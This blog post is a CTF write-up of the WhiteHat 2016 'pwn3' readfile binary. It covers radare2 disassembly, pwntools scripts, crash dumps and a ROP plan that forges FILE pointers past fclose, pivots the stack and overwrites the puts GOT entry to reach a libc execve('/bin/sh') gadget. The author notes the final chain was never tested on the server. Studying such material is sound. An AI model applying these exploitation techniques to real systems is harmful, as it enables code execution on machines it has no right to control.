---
layout: post
title:  "Whitehat - pwn3 - readfile"
date:   2016-09-11 18:03:59
categories: pwn
---

Let's take a look at the `pwn3` challenge from WhiteHat 2016.

# The Challenge

The binary itself is very simple. There are only two functions: `write_file` and `read_file`. The `write_file` function is quite simple and straight forward.

```
$ r2 readfile
[0x08048640]> aaa
[0x08048640]> s sym.write_file 
[0x080486f4]> pdf~call
|           0x08048708      e833feffff     call sym.imp.printf
|           0x08048715      e816ffffff     call sym.imp.__fpurge
|           0x08048721      e82afeffff     call sym.imp.gets
|           0x08048737      e8d4feffff     call sym.imp.fopen
|       |   0x0804874c      e85ffeffff     call sym.imp.puts
|       |   0x08048758      e873feffff     call sym.imp.exit
|           0x08048765      e8d6fdffff     call sym.imp.printf
|           0x08048779      e8a2feffff     call sym.imp.__isoc99_scanf
|           0x080487c5      e876fdffff     call sym.imp.printf
|           0x080487d2      e859feffff     call sym.imp.__fpurge
|           0x080487ef      e86cfdffff     call sym.imp.fgets
|           0x0804880f      e87cfdffff     call sym.imp.fwrite
|           0x0804881a      e851fdffff     call sym.imp.fclose
```

In a nutshell, `write_file` does the following:

* Asks the user for a filename
    * If can't open given filename, exit
* Asks the user for the size of data to write to file
* Asks the user the data to write to file
* Writes the given data to the filename specified
* Exit

Nothing too crazy going on here. We can simply write a file with our contents to disk.

The fun part, comes with `read_file`. The code begins very similarily to `write_file`.

* Asks the user for a filename
* If can't open given filename, exit

Assuming the filename is valid, the following code is executed.

```
|       `-> 0x0804888e      c74424080200.  mov dword [esp + 8], 2
|           0x08048896      c74424040000.  mov dword [esp + 4], 0
|           0x0804889e      8b45f4         mov eax, dword [ebp - local_ch]
|           0x080488a1      890424         mov dword [esp], eax
|           0x080488a4      e8d7fcffff     call sym.imp.fseek
|           0x080488a9      8b45f4         mov eax, dword [ebp - local_ch]
|           0x080488ac      890424         mov dword [esp], eax
|           0x080488af      e83cfdffff     call sym.imp.ftell
|           0x080488b4      8945f0         mov dword [ebp - local_10h], eax
|           0x080488b7      c74424080000.  mov dword [esp + 8], 0
|           0x080488bf      c74424040000.  mov dword [esp + 4], 0
|           0x080488c7      8b45f4         mov eax, dword [ebp - local_ch]
|           0x080488ca      890424         mov dword [esp], eax
|           0x080488cd      e8aefcffff     call sym.imp.fseek
|           0x080488d2      8b55f0         mov edx, dword [ebp - local_10h]
|           0x080488d5      8d85f0feffff   lea eax, [ebp - local_110h]
|           0x080488db      8b4df4         mov ecx, dword [ebp - local_ch]
|           0x080488de      894c240c       mov dword [esp + 0xc], ecx
|           0x080488e2      89542408       mov dword [esp + 8], edx
|           0x080488e6      c74424040100.  mov dword [esp + 4], 1
|           0x080488ee      890424         mov dword [esp], eax
|           0x080488f1      e8aafcffff     call sym.imp.fread
|           0x080488f6      8d85f0feffff   lea eax, [ebp - local_110h]
|           0x080488fc      890424         mov dword [esp], eax
|           0x080488ff      e8acfcffff     call sym.imp.puts
|           0x08048904      8b45f4         mov eax, dword [ebp - local_ch]
|           0x08048907      890424         mov dword [esp], eax
|           0x0804890a      e861fcffff     call sym.imp.fclose
|           0x0804890f      c9             leave
\           0x08048910      c3             ret
```

The juicy bits of this function occurs during the `fread`. The `fread` writes to `local_110h` whatever contents of the file given, giving us a buffer overflow. Time to ROP.. or not so fast.

During this overflow the `local_ch` variable is overwritten which contains the file handle for the open file. This is a problem due to after the overflow occuring, this pointer is passed to `fclose`. If this pointer isn't pointing to a valid `FILE` struct, we get a fantastic segfault which isn't great for us in this case.

We begin with the following script. This script simply creates functions to make calling the binary's functions a bit easier. We are setting the filename to a `cyclic` value of uppercase characters and the contents of the file as another cyclic of lowercase characters so if we see those cyclic values in the crash, we know where the data came from (`win_1.py` in the [Github](https://github.com/ctfhacker/ctf-writeups))

```python
from pwn import *
import string

context.terminal = ['tmux', 'splitw', '-h']

r = None

def write_file(name, data):
    r.sendline('1')
    r.sendline(name)
    r.sendline(str(len(data)))
    r.sendline(data)

def read_file(name):
    r.sendline('2')
    r.sendline(name)

filename = '/tmp/' + cyclic(240, alphabet=string.ascii_uppercase)
print(filename)
try:
    os.remove(filename)
except:
    pass

r = process("./readfile")
write_file(filename, cyclic(1000))

r = process("./readfile")
gdb.attach(r, '''
c
''')
read_file(filename)

r.interactive()
```

Executing this code and we see the following crash.

```
[----------------------REGISTERS-----------------------]
*EAX  0x63616170 ('paac')
*EBX  0xf771b000 <-- 0x1a9da8
*ECX  0xf771bb07 (_IO_2_1_stdout_+71) <-- 0x71c8980a /* '\nq' */
*EDX  0xf771c898 <-- 0x0
*EDI  0x0
*ESI  0x63616170 ('paac')
*EBP  0xffe59fa8 <-- 'saactaacuaacvaa...'
*ESP  0xffe59e50 --> 0xf771bac0 (_IO_2_1_stdout_) <-- 0xfbad2887
*EIP  0xf75d4386 (fclose+22) <-- cmp    byte ptr [esi + 0x46], 0 /* '~F' */
[-------------------------CODE-------------------------]
 => 0xf75d4386 <fclose+22>    cmp    byte ptr [esi + 0x46], 0
    0xf75d438a <fclose+26>    jne    0xf75d4510          <0xf75d4510; fclose+416>
[------------------------STACK-------------------------]
00:0000| esp  0xffe59e50 --> 0xf771bac0 (_IO_2_1_stdout_) <-- 0xfbad2887
01:0004|      0xffe59e54 --> 0xf771b000 <-- 0x1a9da8
02:0008|      0xffe59e58 <-- 0x0
03:000c|      0xffe59e5c <-- 0x0
04:0010|      0xffe59e60 --> 0xffe59fa8 <-- 'saactaacuaacvaa...'
05:0014|      0xffe59e64 --> 0xf7747500 <-- pop    edx
06:0018|      0xffe59e68 --> 0xf771c898 <-- 0x0
07:001c|      0xffe59e6c --> 0xf771b000 <-- 0x1a9da8
[----------------------BACKTRACE-----------------------]
>  f 0 f75d4386 fclose+22
   f 1  804890f read_file+231
   f 2 63616174
   f 3 63616175
   f 4 63616176
   f 5 63616177
   f 6 63616178
   f 7 63616179
   f 8 6461617a
   f 9 64616162
   f 10 64616163
Program received signal SIGSEGV
```

Here we see the crash occurs because `esi+0x46` cannot be dereferenced because esi is part of our cyclic string `paac`. Not really knowing what this means in the `FILE` struct, let's set that `paac` to any valid address to see if we can bypass this crash. To start, let's set that `esi` value to the value of our filename.

```
$ r2 readfile 
[0x08048640]> aaa
[0x08048640]> s obj.name
[0x0804a0a0]> 
```

Updating our script with this value at the offset of `paac` (`win_2.py` in the [Github](https://github.com/ctfhacker/ctf-writeups)).

```python
data = 'a' * cyclic_find('paac')
data += p32(0x804a0a0) # Global address for obj.name
data += 'b' * (1000 - len(data))
write_file(filename, data)
```

And the following crash.

```
[----------------------REGISTERS-----------------------]
...
*EDI  0x41415241 ('ARAA')
...
[-------------------------CODE-------------------------]
 => 0xf76a9d40 <fclose+64>     cmp    ebp, dword ptr [edi + 8]
    0xf76a9d43 <fclose+67>     je     0xf76a9d69          <0xf76a9d69; fclose+105>
```

So we see our `edi` points to part of the cyclic in the filename. This time, replacing the `ARAA` with the address of the filename doesn't lead anywhere. Instead, we try a few different addresses that don't result in the same crash. One address that works is somewhere in the writeable chunk: `0x804af00` (`win_3.py` in the [Github](https://github.com/ctfhacker/ctf-writeups)).

At this point, we get an interesting crash.

```
[----------------------REGISTERS-----------------------]
*EAX  0x41414141 ('AAAA')
 EBX  0xf7710000 <-- 0x1a9da8
*ECX  0x706d742f ('/tmp')
*EDX  0x100
*EDI  0x1000
*ESI  0x804a0a0 (name) <-- '/tmp/aaaabaaaca...'
*EBP  0x61616461 ('adaa')
*ESP  0xffc1a0f0 --> 0x804a0a0 (name) <-- '/tmp/aaaabaaaca...'
*EIP  0xf768da8d <-- call   dword ptr [eax + 0x3c]
 [-------------------------CODE-------------------------]
  => 0xf768da8d    call   dword ptr [eax + 0x3c]
```

We are crashing on a `call [eax+0x3c]` where we control `eax`. This means that we could set `eax` to any address minus `0x3c` (due to the calculation) and call any function we want. It is also useful to note, that we also control `ebp`. This is doubly interesting, because set `ebp` to an address we control and could use a `leave; ret` ROP gadget to pivot our stack to any position we wish. (`win_4.py` in the [Github](https://github.com/ctfhacker/ctf-writeups))

```python
leaveret = 0x80486f1

data = p32(leaveret)

data2 = 'c' * cyclic_find('aaca')
data2 += p32(0x04a0f000) # Use one of the next 0x08 bytes here for the address 0x0804a0f0 (some bytes into the filename)
data2 += '\x08' * (cyclic_find('ARAA', alphabet=string.ascii_uppercase) - 4 - len(data2))
data += data2

data += p32(0x804af00)      # 2) Some valid address to pass fclose
data += p32(0x804a0a5-0x3c) # 3) Address we will be calling at instruction call [eax + 0x3c]
data += cyclic(240-len(data), alphabet=string.ascii_uppercase)
filename = '/tmp/' + data
```

At this point, we now setup the memory to add a ROP chain for full execution.

```
[----------------------REGISTERS-----------------------]
...
*EBP  0x41414141 ('AAAA')
*ESP  0x804a0f8 (name+88) <-- 'CAAADAAAEAAAFAA...'
EIP  0x41414142 ('BAAA')
[------------------------STACK-------------------------]
00:0000| esp  0x804a0f8 (name+88) <-- 'CAAADAAAEAAAFAA...'
01:0004|      0x804a0fc (name+92) <-- 'DAAAEAAAFAAAGAA...'
02:0008|      0x804a100 (name+96) <-- 'EAAAFAAAGAAAHAA...'
03:000c|      0x804a104 (name+100) <-- 'FAAAGAAAHAAAIAA...'
04:0010|      0x804a108 (name+104) <-- 'GAAAHAAAIAAAJAA...'
05:0014|      0x804a10c (name+108) <-- 'HAAAIAAAJAAAKAA...'
06:0018|      0x804a110 (name+112) <-- 'IAAAJAAAKAAALAA...'
07:001c|      0x804a114 (name+116) <-- 'JAAAKAAALAAAMAA...'
[----------------------BACKTRACE-----------------------]
>  f 0 41414142
   f 1 41414143
   f 2 41414144
   f 3 41414145
   f 4 41414146
```

# And now we ROP...

By reading `/etc/os-release` on the server, we know that the server is an `Ubuntu 14` machine. We are also working on an `Ubuntu 14` machine, so we assume the same libc. (Note, I wasn't able to finally test this chain on the game server as time expired. Let's just assume the local environment was the same as the game ;-)

There are a lot of possibilities for the ROP chain, so let's try to call the "magic ROP gadget" which calls `execve('/bin/sh', 0, 0)` from libc. This gadget is found at `libc_base + 0x40069`. Typically, one calls this gadget one instruction before, but because we clobber ebx in the process, we can simply set `eax` to `/bin/sh` ourselves then call the remaining instructions.

```
.text:00040069                 mov     [esp+16Ch+status], eax
.text:0004006C                 call    execve
```

Two useful gadgets that can be found in the binary are below using `ROPgadget --depth 50 --binary readfile`.

```
1:
0x080486af : mov eax, dword ptr [0x804a088] ; cmp eax, ebx ; jb 0x80486ba ; mov byte ptr [0x804a084], 1 ; add esp, 4 ; pop ebx ; pop ebp ; ret
2:
0x080486be : add dword ptr [ebx + 0x5d5b04c4], eax ; ret
```

Turns out, there isn't an easy `pop eax; ret` in this binary, so we have to improvise on getting a value into `eax`. This is where the first gadget comes into play. The first gadget takes a value at `0x804a088` and puts that value into `eax`. Now we ask "How can we get a value into `0x804a088`"? Well lucky for us, `gets` comes in our binary for free. So our full gadget to get a value into eax is below:

* ROP into `gets(0x804a088)`
* Send a value to be stored in `0x804a088`
* ROP into `0x80486af` to put that value into `eax`

We need to preset `ebx` to zero so that it always fails the `cmp eax, ebx` check. This is easily accomplished with a simple `pop ebx; pop ebp; ret` gadget. At the end of this same gadget, we also see a `pop ebx`. So this gadget can also be used to get an arbitrary value into `ebx`. This is important because our second gadget can be used to add a constant in `eax` into the value at address `ebx+0x5d5b04c4`.

Our plan of attack now is to add a constant value to the `puts` GOT entry such that the result points to the magic libc address. We can find how much to add by using `pwntools` (We are choosing to add to `puts` arbitrarily).

```python
>>> from pwn import *
>>> elf = ELF('libc-2.19.so')
>>> # 0x40069 is from the above magic libc offset
>>> print(0x40069 - elf.symbols['puts'])
-153075
>>> hex(0xffffffff-153075)
'0xfffdaa19'
```

At this point, we can simply call `puts` to call our magic function and grab our shell.

Let's see how we can put this plan into action in our ROP chain:

ROP chain 1

* Call `gets` with an address further down the `0x804a000` chunk because we currently have limited space. This will allow us to have a larger ROP chain.
* Send our second ROP chain
* Stack pivot to this new address so we are now executing a much larger ROP chain.

ROP chain 2

* Call `gets(0x804a088)`
* Send `0xfffdaa18` to store the value in `0x804a08c`
* Call `0x80486af` with the correct stack to mov `0xfffdaa13` into eax and `puts`-0x5d5b04c4 into ebx (subtract 0x5d5b04c4 due to the gadget adding it back)
* Call `0x80486be` to do the add constant to `puts` to get the address of the magic libc
* Call `gets(0x804af00)` to put the string `/bin/sh` into memory
* Call `gets(0x804a088)` to put pointer to the string `/bin/sh` into memory in preparation for the first gadget
* Call our first gadget to get the pointer to `/bin/sh` into `eax`
* Call `puts` to trigger the libc gadget

Final code can be found in `win_5.py` in the [Github](https://github.com/ctfhacker/ctf-writeups).

<script type="text/javascript" src="https://asciinema.org/a/4naosbxusuv26oynyas1gaju8.js" id="asciicast-4naosbxusuv26oynyas1gaju8" async></script>
